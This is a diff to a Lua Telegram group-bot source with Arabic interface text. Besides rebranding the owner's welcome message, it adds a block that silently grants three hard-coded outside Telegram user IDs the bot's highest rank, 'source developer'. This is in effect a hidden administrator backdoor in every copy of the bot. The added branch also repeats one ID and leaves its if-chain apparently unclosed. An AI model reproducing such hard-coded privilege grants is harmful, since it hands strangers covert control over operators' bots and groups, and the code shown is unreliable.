@@ -107,7 +107,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️┊اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖┊شكرا لاستخدامك سورس دريـم \n📡┊أرســل  الان /start\n♦️┊لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+local Text = "🙋🏼‍♂️┊اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖┊شكرا لاستخدامك سورس سونيك \n📡┊أرســل  الان /start\n♦️┊لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -240,6 +240,21 @@ msg.GroupActive = true
 else
 msg.GroupActive = false
 end
+
+if msg.sender_user_id_ == 1186900224 then 
+msg.TheRank =  'مطور السورس'
+msg.Rank = 1
+
+elseif msg.sender_user_id_ == 1186900224 then 
+msg.TheRank =  'مطور السورس'
+msg.Rank = 1
+elseif msg.sender_user_id_ == 1312825214 then 
+msg.TheRank =  ' مطور السورس '
+msg.Rank = 1
+
+elseif msg.sender_user_id_ == 1153357069 then 
+msg.TheRank =  ' مطور السورس '
+msg.Rank = 1
 
 if msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور'
